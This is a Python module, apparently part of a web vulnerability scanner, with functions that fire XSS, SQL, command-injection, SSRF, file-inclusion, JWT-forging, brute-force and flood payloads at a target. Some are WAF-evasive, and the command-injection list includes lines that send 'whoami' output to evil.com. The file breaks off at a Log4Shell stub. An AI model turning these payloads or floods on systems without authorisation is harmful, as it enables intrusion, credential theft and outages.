from typing import Any, Dict, List, Optional
import time
import concurrent.futures
import threading
import urllib.parse
import os
import json
import string
import random
import socket
import hashlib
import ssl
from ..http_client import HttpClient, ResponseWrapper
from ..scenarios import SimpleScenario

# ==========================================
# OMNI-ATTACK ENGINE: LOGIC & PAYLOADS
# ==========================================

def run_advanced_dos(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Advanced DoS: Layer 7 stress testing."""
    # Placeholder for actual implementation, prevents engine crash
    return {"scenario_id": scenario.id, "attack_type": "advanced_dos", "passed": True, "details": "Module placeholder - actual logic to be implemented."}

def run_header_security_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Checks for missing security headers (Clickjacking, MIME, CORS)."""
    resp = client.send(scenario.method, scenario.target)
    headers = {k.lower(): v for k, v in resp.headers.items()}
    issues = []
    
    if resp.status_code == 0:
        return {"scenario_id": scenario.id, "attack_type": "header_security", "passed": False, "details": {"error": f"Connection Error: {resp.text}"}}

    # Standard Checks
    if "x-frame-options" not in headers and "content-security-policy" not in headers:
        issues.append("Missing Clickjacking Protection (X-Frame-Options / CSP)")
    if "x-content-type-options" not in headers:
        issues.append("Missing X-Content-Type-Options: nosniff")
    
    # Aggressive/In-depth Checks
    if scenario.config.get("aggressive"):
        if "strict-transport-security" not in headers and scenario.target.startswith("https"):
            issues.append("Missing HSTS Header (High Severity for Prod)")
        if "permissions-policy" not in headers:
            issues.append("Missing Permissions-Policy")
        acao = headers.get("access-control-allow-origin")
        if acao == "*":
            issues.append("CORS Misconfiguration: Wildcard Origin Allowed")

    return {"scenario_id": scenario.id, "attack_type": "header_security", "passed": len(issues) == 0, "status": "CONFIRMED" if issues else "SECURE", "details": {"issues": issues}}

def run_xss_scan(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Reflected & Path-based XSS with Polyglot payloads."""
    # FREE TIER: Standard, safe payloads
    payloads = [
        "<script>alert(1)</script>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)"
    ]
    
    # AGGRESSIVE TIER: Obfuscated, WAF-evasive, and modern payloads
    if scenario.config.get("aggressive"):
        payloads.extend([
            "'\"><img src=x onerror=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<math><a xlink:href=\"javascript:alert(1)\">X",
            "javascript://%250Aalert(1)",
            "{{constructor.constructor('alert(1)')()}}",
            "<marquee loop=1 width=0 onfinish=alert(1)>X</marquee>",
            "<input onfocus=alert(1) autofocus>",
            "\"'><script>confirm(1)</script>",
            "<scr<script>ipt>alert(1)</script>",
            "%%3Cscript%%3Ealert(1)%%3C/script%%3E",
            "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"
        ])

    from ..utils import extract_reflection_context
    fields = scenario.config.get("fields", ["q", "search", "name", "id", "query"])
    issues, lock, artifacts = [], threading.Lock(), []

    limit = 2 if client._is_localhost else (50 if scenario.config.get("aggressive") else 10)
    
    # BASELINE for XSS
    baseline = client.send("GET", scenario.target, params={fields[0]: "BENIGN_VAL"}, is_canary=True).text

    def check_xss(field):
        for p in payloads:
            if issues: break
            # Test GET Params
            resp = client.send("GET", scenario.target, params={field: p}, is_canary=True)
            
            # Context-Aware Detection
            context = extract_reflection_context(resp.text, p)
            if context != "none" and p not in baseline:
                # Double check with a unique string
                unique_canary = f"BRK_{random.randint(1000,9999)}"
                resp_verify = client.send("GET", scenario.target, params={field: unique_canary}, is_canary=True)
                if unique_canary in resp_verify.text:
                    with lock:
                        issues.append(f"XSS Reflected in GET '{field}' (Context: {context})")
                        artifacts.append({"request": resp_verify.request_dump, "response": resp_verify.response_dump})
                    break
            
            # Test POST JSON (Aggressive)
            if scenario.config.get("aggressive"):
                resp_post = client.send("POST", scenario.target, json_body={field: p}, is_canary=True)
                context_post = extract_reflection_context(resp_post.text, p)
                if context_post != "none" and p not in baseline:
                    unique_canary = f"BRK_{random.randint(1000,9999)}"
                    resp_verify = client.send("POST", scenario.target, json_body={field: unique_canary}, is_canary=True)
                    if unique_canary in resp_verify.text:
                        with lock:
                            issues.append(f"XSS Reflected in POST JSON '{field}' (Context: {context_post})")
                            artifacts.append({"request": resp_verify.request_dump, "response": resp_verify.response_dump})
                        break

    with concurrent.futures.ThreadPoolExecutor(max_workers=min(limit, len(fields))) as executor:
        executor.map(check_xss, fields)

    return {
        "scenario_id": scenario.id, 
        "attack_type": "xss", 
        "passed": not issues, 
        "confidence": "HIGH" if issues else "LOW",
        "details": issues,
        "artifacts": artifacts
    }

def run_jwt_brute(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """JWT Weak Secret Brute Force: Testing common keys."""
    # Real logic: Try to sign a token with common secrets and see if server accepts it
    import base64
    import hmac
    import hashlib
    
    # We need a base token to work with. If not provided, we use a guest one.
    base_token = scenario.config.get("token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaGFja2VyIn0")
    header_name = scenario.config.get("header", "Authorization")
    
    parts = base_token.split('.')
    if len(parts) < 2:
        return {"scenario_id": scenario.id, "attack_type": "jwt_brute", "passed": True, "details": "Invalid base token."}
    
    payload_to_sign = f"{parts[0]}.{parts[1]}"
    secrets = ["secret", "123456", "password", "admin", "dev", "test", "key", "root"]
    
    issues = []
    for s in secrets:
        signature = hmac.new(s.encode(), payload_to_sign.encode(), hashlib.sha256).digest()
        new_token = f"{payload_to_sign}.{base64.urlsafe_b64encode(signature).decode().rstrip('=')}"
        
        resp = client.send("GET", scenario.target, headers={header_name: f"Bearer {new_token}"})
        if resp.status_code == 200 and ("hacker" in resp.text.lower() or "admin" in resp.text.lower()):
            issues.append(f"JWT Weak Secret Confirmed: '{s}'")
            break
            
    return {"scenario_id": scenario.id, "attack_type": "jwt_brute", "passed": not issues, "details": issues}

def run_sqli_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """SQL Injection: Boolean-based, Time-based, and Internal Error Detection."""
    # FREE TIER: Simple auth bypass and error probes
    payloads = [
        {"p": "' OR '1'='1", "t": "auth"},
        {"p": "' OR 1=1 --", "t": "auth"},
        {"p": "admin' --", "t": "auth"},
    ]
    
    # AGGRESSIVE TIER: Time-based, Union, and WAF evasion
    if scenario.config.get("aggressive"):
        payloads.extend([
            {"p": "'; WAITFOR DELAY '0:0:5'--", "t": "time"},
            {"p": "' OR SLEEP(5)--", "t": "time"},
            {"p": "' UNION SELECT 1,2,3,4,5,6--", "t": "union"},
            {"p": "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", "t": "time"},
            {"p": "1' ORDER BY 10--", "t": "error"}
        ])

    fields = scenario.config.get("fields", ["username", "id", "q", "token"])
    issues, lock, artifacts = [], threading.Lock(), []
    limit = 2 if client._is_localhost else (50 if scenario.config.get("aggressive") else 10)
    
    # BASELINE for SQLi
    baseline_resp = client.send("GET", scenario.target, params={fields[0]: "BENIGN_VAL"}, is_canary=True)
    baseline_time = baseline_resp.elapsed_ms / 1000.0

    def check_sqli(field):
        for item in payloads:
            if issues: break
            payload = item["p"]
            
            # Probing GET
            resp = client.send("GET", scenario.target, params={field: payload}, is_canary=True)
            duration = resp.elapsed_ms / 1000.0
            
            # 1. Error-based Detection
            err_sigs = ["sql syntax", "unclosed quotation", "mysql_fetch", "sqlite3.Error", "postgresql query failed", "driver failure"]
            if any(sig in resp.text.lower() for sig in err_sigs):
                if not any(sig in baseline_resp.text.lower() for sig in err_sigs):
                    with lock:
                        issues.append(f"SQL Error in '{field}' with {payload}")
                        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
                    break
                
            # 2. Time-based Detection (Robust)
            if item["t"] == "time" and duration > (baseline_time + 4.5):
                resp_retry = client.send("GET", scenario.target, params={field: payload}, is_canary=True)
                if (resp_retry.elapsed_ms / 1000.0) > (baseline_time + 4.5):
                     with lock:
                         issues.append(f"CONFIRMED Time-based SQLi in '{field}'")
                         artifacts.append({"request": resp_retry.request_dump, "response": resp_retry.response_dump})
                     break

            # 3. Auth Bypass Detection (DELTA logic)
            if item["t"] == "auth" and resp.status_code == 200 and baseline_resp.status_code != 200:
                if "login" not in resp.text.lower() or "dashboard" in resp.text.lower():
                     with lock:
                         issues.append(f"Potential Auth Bypass in '{field}'")
                         artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
                     break

    with concurrent.futures.ThreadPoolExecutor(max_workers=min(limit, len(fields))) as executor:
        executor.map(check_sqli, fields)

    return {
        "scenario_id": scenario.id, 
        "attack_type": "sql_injection", 
        "passed": not issues, 
        "confidence": "HIGH" if issues else "LOW", 
        "details": issues,
        "artifacts": artifacts
    }

def run_brute_force(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Brute Force: Common credentials and weak passwords."""
    username = scenario.config.get("user", "admin")
    # FREE TIER: Top 5 common passwords
    passwords = ["123456", "password", "12345678", "qwerty", "admin"]
    
    # AGGRESSIVE TIER: Expanded wordlist
    if scenario.config.get("aggressive"):
        passwords.extend(["12345", "password123", "root", "guest", "1234567"])

    success_creds, lock = [], threading.Lock()
    def check_pwd(pwd):
        resp = client.send("POST", scenario.target, json_body={"username": username, "password": pwd})
        if resp.status_code == 200 and any(k in resp.text.lower() for k in ["token", "success", "profile", "dashboard"]):
            with lock: success_creds.append(pwd)

    limit = 2 if client._is_localhost else 20
    with concurrent.futures.ThreadPoolExecutor(max_workers=limit) as executor:
        executor.map(check_pwd, passwords)

    return {"scenario_id": scenario.id, "attack_type": "brute_force", "passed": not success_creds, "details": f"Credentials Found: {success_creds}" if success_creds else "No weak credentials found."}

def run_rce_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Remote Code Execution: OS Command Injection & Function Injection."""
    # FREE TIER: Simple info gather
    payloads = ["; id", "| whoami", "$(id)", "`id`", "& whoami"]
    
    # AGGRESSIVE TIER: Out-of-band and blind techniques
    if scenario.config.get("aggressive"):
        payloads.extend([
            "import os; os.system('id')",
            "; curl http://evil.com/`whoami`",
            "| nslookup `whoami`.evil.com",
            "; sleep 5",
            "<?php system('id'); ?>"
        ])

    fields = scenario.config.get("fields", ["id", "cmd", "q", "query"])
    issues, lock = [], threading.Lock()
    limit = 2 if client._is_localhost else (50 if scenario.config.get("aggressive") else 10)
    
    # BASELINE for RCE
    baseline_resp = client.send(scenario.method, scenario.target, json_body={fields[0]: "BENIGN_VAL"}, is_canary=True)
    baseline_time = baseline_resp.elapsed_ms / 1000.0

    artifacts = []
    def check_field(field):
        for p in payloads:
            if issues: break
            resp = client.send("POST", scenario.target, json_body={field: p}, is_canary=True)
            duration = resp.elapsed_ms / 1000.0
            output = resp.text.lower()
            
            # OS Command output check
            if ("uid=" in output and "gid=" in output) or "nt authority" in output or "microsoft windows [" in output:
                if "uid=" not in baseline_resp.text.lower():
                    with lock:
                        issues.append(f"RCE CONFIRMED in '{field}' with payload {p}")
                        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
                    break
            
            # Time-based RCE
            if "sleep 5" in p and duration > (baseline_time + 4.5):
                resp_retry = client.send("POST", scenario.target, json_body={field: p}, is_canary=True)
                if (resp_retry.elapsed_ms / 1000.0) > (baseline_time + 4.5):
                     with lock:
                         issues.append(f"CONFIRMED Blind RCE (Time-based) in '{field}'")
                         artifacts.append({"request": resp_retry.request_dump, "response": resp_retry.response_dump})
                     break

    with concurrent.futures.ThreadPoolExecutor(max_workers=min(limit, len(fields))) as executor:
        executor.map(check_field, fields)

    return {
        "scenario_id": scenario.id, 
        "attack_type": "rce", 
        "passed": not issues, 
        "confidence": "HIGH" if issues else "LOW", 
        "status": "CONFIRMED" if issues else "SECURE", 
        "details": issues,
        "artifacts": artifacts
    }

def run_ssrf_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Server Side Request Forgery: Localhost & Cloud Metadata."""
    # FREE TIER: Local and AWS metadata
    payloads = [
        "http://localhost:80",
        "http://127.0.0.1:22",
        "http://169.254.169.254/latest/meta-data/"
    ]
    
    # AGGRESSIVE TIER: Internal port scanning & Cloud specific (Google, Azure)
    if scenario.config.get("aggressive"):
        payloads.extend([
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "file:///etc/passwd",
            "dict://127.0.0.1:6379/", # Redis probe
            "http://192.168.1.1/"
        ])

    fields = scenario.config.get("fields", ["url", "dest", "webhook", "callback"])
    issues, lock = [], threading.Lock()
    limit = 2 if client._is_localhost else 20

    # SSRF Detection Logic
    baseline_resp = client.send("POST", scenario.target, json_body={fields[0]: "BENIGN_VAL"})
    baseline = baseline_resp.text.lower()

    def check_ssrf(field):
        for p in payloads:
            if issues: break
            resp = client.send("POST", scenario.target, json_body={field: p})
            text = resp.text.lower()
            
            # High-Confidence Indicators
            indicators = ["ami-id", "instance-id", "root:x:0:0", "ssh-rsa", "metadata-flavor", "computeMetadata"]
            detected = [i for i in indicators if i in text and i not in baseline]
            
            if detected:
                with lock: issues.append(f"SSRF CONFIRMED in '{field}' -> {p} (Evidence: {detected})")
                break
                
            if resp.status_code == 200 and baseline_resp.status_code != 200 and len(resp.text) > 500:
                with lock: issues.append(f"Potential SSRF (Baseline {baseline_resp.status_code} -> 200 OK) in '{field}'")
                break

    with concurrent.futures.ThreadPoolExecutor(max_workers=min(limit, len(fields))) as executor:
        executor.map(check_ssrf, fields)

    return {"scenario_id": scenario.id, "attack_type": "ssrf", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues}

def run_lfi_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Local File Inclusion: Traversal and Absolute Pathing."""
    # FREE TIER: Standard Unix/Windows files
    payloads = ["../../../../etc/passwd", "../../../../windows/win.ini", "/etc/passwd"]
    
    # AGGRESSIVE TIER: Log poisoning and filter bypass
    if scenario.config.get("aggressive"):
        payloads.extend([
            "....//....//....//....//etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "/proc/self/environ",
            "/var/log/apache2/access.log"
        ])

    fields = scenario.config.get("fields", ["file", "page", "path", "doc"])
    issues = []

    for field in fields:
        for p in payloads:
            resp = client.send("GET", scenario.target, params={field: p})
            if "root:x:0:0" in resp.text or "[extensions]" in resp.text.lower():
                issues.append(f"LFI Found in '{field}' with {p}")
                break

    return {"scenario_id": scenario.id, "attack_type": "lfi", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues}

def run_idor_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Insecure Direct Object Reference: ID Incrementing and UUID Probing."""
    # FREE TIER: Simple numeric increments
    id_range = ["1", "2", "3", "10", "100"]
    
    # AGGRESSIVE TIER: UUIDs and common patterns
    if scenario.config.get("aggressive"):
        id_range.extend(["0", "-1", "9999", "admin", "test"])

    from ..utils import StructuralComparator
    issues, lock = [], threading.Lock()
    base_target = scenario.target.replace("{{id}}", "ID_PLACEHOLDER")
    
    # BASELINE for IDOR
    baseline = client.send(scenario.method, scenario.target if "{{" not in scenario.target else scenario.target.replace("{{id}}", "EXISTING_VAL_999"), is_canary=True)

    def check_id(val):
        path = base_target.replace("ID_PLACEHOLDER", str(val))
        if path == base_target: path = f"{scenario.target.rstrip('/')}/{val}"
        
        resp = client.send(scenario.method, path, is_canary=True)
        
        # Enhanced Detection: Using Structural Diffing
        if resp.status_code == 200 and baseline.status_code != 200:
             with lock: issues.append(f"IDOR: Private Resource accessible at ID: {val} (Baseline was {baseline.status_code})")
        elif resp.status_code == 200 and StructuralComparator.is_significant_delta(baseline.text, resp.text):
             if "error" not in resp.text.lower() and "login" not in resp.text.lower():
                 with lock: issues.append(f"IDOR: Distinct structural object discovered at ID: {val}")

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        executor.map(check_id, id_range)

    return {"scenario_id": scenario.id, "attack_type": "idor", "passed": not issues, "details": issues}

def run_nosql_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """NoSQL Injection: MongoDB Operator Abuse."""
    # FREE TIER: Simple $ne bypass
    payloads = [{"$ne": "random_string_123"}, {"$gt": ""}]
    
    # AGGRESSIVE TIER: Regex and complex logic
    if scenario.config.get("aggressive"):
        payloads.extend([{"$regex": ".*"}, {"$where": "true"}])

    from ..utils import StructuralComparator
    fields = scenario.config.get("fields", ["username", "password", "id"])
    issues, lock, artifacts = [], threading.Lock(), []
    
    # BASELINE
    baseline_resp = client.send("POST", scenario.target, json_body={fields[0]: "BENIGN_USER_XYZ"})

    def check_nosql(field):
        for p in payloads:
            if issues: break
            resp = client.send("POST", scenario.target, json_body={field: p})
            # NoSQL Bypass detection: Structural Delta logic
            if resp.status_code == 200 and baseline_resp.status_code != 200:
                 if any(k in resp.text.lower() for k in ["token", "success", "welcome"]):
                     with lock:
                         issues.append(f"NoSQL Bypass in '{field}' (Baseline was {baseline_resp.status_code})")
                         artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
                     break
            elif resp.status_code == 200 and StructuralComparator.is_significant_delta(baseline_resp.text, resp.text):
                 if "welcome" in resp.text.lower() and "welcome" not in baseline_resp.text.lower():
                     with lock:
                         issues.append(f"NoSQL Injection Structural Shift in '{field}'")
                         artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
                     break

    with concurrent.futures.ThreadPoolExecutor(max_workers=len(fields)) as executor:
        executor.map(check_nosql, fields)

    return {"scenario_id": scenario.id, "attack_type": "nosql_injection", "passed": not issues, "details": issues, "artifacts": artifacts}

def run_jwt_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """JWT Weaknesses: None Algorithm and Kidd/Jku abuse."""
    header_name = scenario.config.get("header", "Authorization")
    # Real payload for 'none' alg
    payloads = [
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
        "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
        "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
    ]
    
    issues = []
    for p in payloads:
        resp = client.send("GET", scenario.target, headers={header_name: f"Bearer {p}"})
        if resp.status_code == 200 and ("admin" in resp.text.lower() or "dashboard" in resp.text.lower()):
            issues.append(f"JWT 'none' algorithm accepted with payload: {p[:15]}...")
            break

    return {"scenario_id": scenario.id, "attack_type": "jwt_weakness", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues}

def run_ssti_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Server Side Template Injection: Jinja2, Mako, Thymeleaf."""
    # High-Entropy Payload: 12345 * 12345 = 152399025
    canary = "152399025"
    payload = "{{12345*12345}}"
    
    if scenario.config.get("aggressive"):
        payload = "{{constructor.constructor('return 152399025')()}}"

    fields = scenario.config.get("fields", ["name", "q", "comment"])
    issues = []
    
    # BASELINE
    baseline = client.send("GET", scenario.target, params={fields[0]: "BENIGN"}).text

    for f in fields:
        resp = client.send("GET", scenario.target, params={f: payload})
        if canary in resp.text and canary not in baseline:
            issues.append(f"SSTI detected in '{f}' (Confirmed math evaluation)")
            break

    return {"scenario_id": scenario.id, "attack_type": "ssti", "passed": not issues, "details": issues}

def run_dos_extreme(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Denial of Service: Resource Exhaustion & Stress Test."""
    # FREE TIER: Light stress
    requests_to_send = 100
    
    # AGGRESSIVE TIER: Heavy flood
    if scenario.config.get("aggressive"):
        requests_to_send = 10000

    stats, stop_event = {"requests": 0}, threading.Event()
    def flood():
        while not stop_event.is_set() and stats["requests"] < requests_to_send:
            try: 
                client.send(scenario.method, scenario.target, is_canary=True)
                stats["requests"] += 1
            except: pass
    
    threads = [threading.Thread(target=flood, daemon=True) for _ in range(50)]
    for t in threads: t.start()
    
    start = time.time()
    while time.time() - start < scenario.config.get("duration", 5) and stats["requests"] < requests_to_send:
        time.sleep(0.5)
    
    stop_event.set()
    return {"scenario_id": scenario.id, "attack_type": "dos_extreme", "passed": True, "details": f"Stress Test: {stats['requests']} requests sent."}


def run_xml_bomb(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """XML Billion Laughs: Memory exhaustion probe."""
    payload = """<?xml version="1.0"?>
    <!DOCTYPE lolz [
     <!ENTITY lol "lol">
     <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
     <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
     <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    ]>
    <lolz>&lol3;</lolz>"""
    resp = client.send("POST", scenario.target, form_body=payload, headers={"Content-Type": "application/xml"})
    issues = ["XML Bomb Triggered Service Lag"] if resp.elapsed_ms > 1000 or resp.status_code == 500 else []
    return {"scenario_id": scenario.id, "attack_type": "xml_bomb", "passed": not issues, "details": issues or "Target XML parser is resilient."}

def run_redos(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Regular Expression DoS: Catastrophic backtracking probe."""
    # Payload designed to trip O(2^n) regex engines
    payload = "a" * 100 + "!"
    field = scenario.config.get("fields", ["email", "q"])[0]
    resp = client.send("POST", scenario.target, json_body={field: payload}, timeout=10)
    issues = ["Potential ReDoS detected (Timeout)"] if resp.status_code == 0 or resp.elapsed_ms > 5000 else []
    return {"scenario_id": scenario.id, "attack_type": "redos", "passed": not issues, "details": issues or "Target regex engine handled complex input."}

def run_prototype_pollution(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Prototype Pollution: Object.prototype manipulation."""
    payloads = [{"__proto__": {"polluted": "true"}}, {"constructor": {"prototype": {"polluted": "true"}}}]
    issues = []
    
    for payload in payloads:
        resp = client.send("POST", scenario.target, json_body=payload)
        if resp.status_code == 500:
            issues.append("Possible Prototype Pollution: Server Error 500 on injection")
            break
            
    return {"scenario_id": scenario.id, "attack_type": "prototype_pollution", "passed": not issues, "details": issues}

def run_clickjacking(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Clickjacking: Frame protection check."""
    resp = client.send("GET", scenario.target)
    issues, xfo, csp = [], resp.headers.get("X-Frame-Options", "").lower(), resp.headers.get("Content-Security-Policy", "").lower()
    if "deny" not in xfo and "sameorigin" not in xfo:
        if "frame-ancestors" not in csp:
            issues.append("Clickjacking Risk: Missing X-Frame-Options and CSP frame-ancestors.")
    return {"scenario_id": scenario.id, "attack_type": "clickjacking", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues}


def run_open_redirect(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Open Redirect: Header and Meta-refresh bypasses."""
    # FREE TIER: Simple domain redirects
    payloads = ["http://evil.com", "//evil.com", "https://google.com"]
    
    # AGGRESSIVE TIER: Obfuscated and bypass schemes
    if scenario.config.get("aggressive"):
        payloads.extend([
            "/%09/evil.com",
            "/%5c/evil.com",
            "//evil.com/%2f%2e%2e",
            "http:evil.com",
            "//google.com%2fevil.com"
        ])

    fields = scenario.config.get("fields", ["next", "url", "redirect", "u", "returnTo", "target"])
    issues, lock, artifacts = [], threading.Lock(), []

    def check_redirect(field):
        for p in payloads:
            if issues: break
            resp = client.send("GET", scenario.target, params={field: p})
            if "evil.com" in resp.url or "google.com" in resp.url or "evil.com" in resp.headers.get("Location", ""):
                with lock:
                    issues.append(f"Open Redirect in '{field}' -> {p}")
                    artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
                break

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(check_redirect, fields)

    return {"scenario_id": scenario.id, "attack_type": "open_redirect", "passed": not issues, "details": issues, "artifacts": artifacts}

def run_cors_misconfig(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """CORS Misconfiguration: Wildcard and Reflection checks."""
    issues = []
    
    # FREE TIER: Simple wildcard check
    resp = client.send("OPTIONS", scenario.target, headers={"Origin": "https://evil.com"})
    acao = resp.headers.get("Access-Control-Allow-Origin", "")
    if acao == "*" or acao == "https://evil.com":
        issues.append(f"CORS Misconfiguration: {acao} reflected in Access-Control-Allow-Origin")
        
    # AGGRESSIVE TIER: Credential and Null origin checks
    if scenario.config.get("aggressive"):
        resp_null = client.send("OPTIONS", scenario.target, headers={"Origin": "null"})
        if resp_null.headers.get("Access-Control-Allow-Origin") == "null":
            issues.append("CORS Misconfiguration: Null Origin allowed")
            
        allow_creds = resp.headers.get("Access-Control-Allow-Credentials", "").lower()
        if allow_creds == "true" and acao == "*":
             issues.append("CORS Risk: Wildcard origin with credentials allowed")

    return {"scenario_id": scenario.id, "attack_type": "cors_origin", "passed": not issues, "details": issues}

def run_host_header_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Host Header Injection: Cache poisoning and reset link bypasses."""
    evil_host = "evil.com"
    issues = []
    
    try:
        # FREE TIER: Basic Host header override
        resp = client.send("GET", scenario.target, headers={"Host": evil_host}, timeout=5)
        if evil_host in resp.headers.get("Location", "") or evil_host in resp.text:
            issues.append("Host Header Injection: 'evil.com' reflected in response.")
    except Exception as e:
        # If connection is refused specifically when overriding Host, it might be an indicator of a strict WAF or proxy
        if "Connection" in str(e):
             # Silently fail or log as info; don't crash
             pass

    # AGGRESSIVE TIER: X-Forwarded-Host and Host-Port bypasses
    if scenario.config.get("aggressive"):
        try:
            resp_xfh = client.send("GET", scenario.target, headers={"X-Forwarded-Host": evil_host})
            if evil_host in resp_xfh.text:
                issues.append("X-Forwarded-Host Injection: 'evil.com' reflected.")
        except: pass
            
    return {"scenario_id": scenario.id, "attack_type": "host_header", "passed": not issues, "details": issues}

def run_swagger_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Swagger/OpenAPI UI discovery."""
    targets = ["/v2/api-docs", "/swagger-ui.html", "/api/docs", "/swagger/index.html"]
    issues = []
    for t in targets:
         resp = client.send("GET", t)
         if resp.status_code == 200 and ("swagger" in resp.text.lower() or "openapi" in resp.text.lower()):
             issues.append(f"Swagger documentation at {t}"); break
    return {"scenario_id": scenario.id, "attack_type": "swagger_exposure", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues}

def run_git_exposure(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Git Repository exposure check."""
    resp = client.send("GET", "/.git/HEAD")
    issues = ["Exposed .git"] if (resp.status_code == 200 and "refs/heads" in resp.text) else []
    return {"scenario_id": scenario.id, "attack_type": "git_exposure", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues}

def run_env_exposure(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Environment file exposure check."""
    resp = client.send("GET", "/.env")
    issues = ["Exposed .env"] if (resp.status_code == 200 and ("DB_PASS" in resp.text or "API_KEY" in resp.text or "PORT=" in resp.text)) else []
    return {"scenario_id": scenario.id, "attack_type": "env_exposure", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues}

def run_phpinfo(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """phpinfo() exposure check."""
    resp = client.send("GET", "/phpinfo.php")
    issues = ["Exposed phpinfo()"] if (resp.status_code == 200 and "PHP Version" in resp.text) else []
    return {"scenario_id": scenario.id, "attack_type": "phpinfo", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues}

def run_ds_store(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """DS_Store exposure check."""
    resp = client.send("GET", "/.DS_Store")
    issues = ["Exposed .DS_Store"] if (resp.status_code == 200 and "Mac OS X" in resp.text) else []
    return {"scenario_id": scenario.id, "attack_type": "ds_store_exposure", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues}

def run_email_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Email Header Injection: CRLF in email fields."""
    payload = "user@test.com%0ABcc:victim@evil.com"
    field = scenario.config.get("fields", ["email"])[0]
    resp = client.send("POST", scenario.target, json_body={field: payload})
    issues = ["Possible Email Header Injection"] if resp.status_code == 200 and "victim@evil.com" in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "email_injection", "passed": not issues, "details": issues}

def run_ldap_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """LDAP Injection: Filter bypass strings."""
    payload = "*)(cn=*))"
    resp = client.send("GET", scenario.target, params={"user": payload})
    issues = ["LDAP Injection Potential"] if (resp.status_code == 200 and "admin" in resp.text.lower()) else []
    return {"scenario_id": scenario.id, "attack_type": "ldap_injection", "passed": not issues, "details": issues}

def run_xpath_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """XPath Injection: Boolean bypass for XML databases."""
    payload = "' or '1'='1"
    resp = client.send("GET", scenario.target, params={"q": payload})
    issues = ["XPath Injection Risk"] if "xpath" in resp.text.lower() or resp.status_code == 200 and "admin" in resp.text.lower() else []
    return {"scenario_id": scenario.id, "attack_type": "xpath_injection", "passed": not issues, "details": issues}

def run_ssi_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """SSI Injection: Server Side Includes exec probe."""
    payload = '<!--#exec cmd="ls" -->'
    resp = client.send("GET", scenario.target, params={"q": payload})
    issues = ["SSI Injection Found"] if "bin" in resp.text and "etc" in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "ssi_injection", "passed": not issues, "details": issues}

def run_cve_log4shell(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Log4Shell (CVE-2021-44228): JNDI Injection in headers/params."""
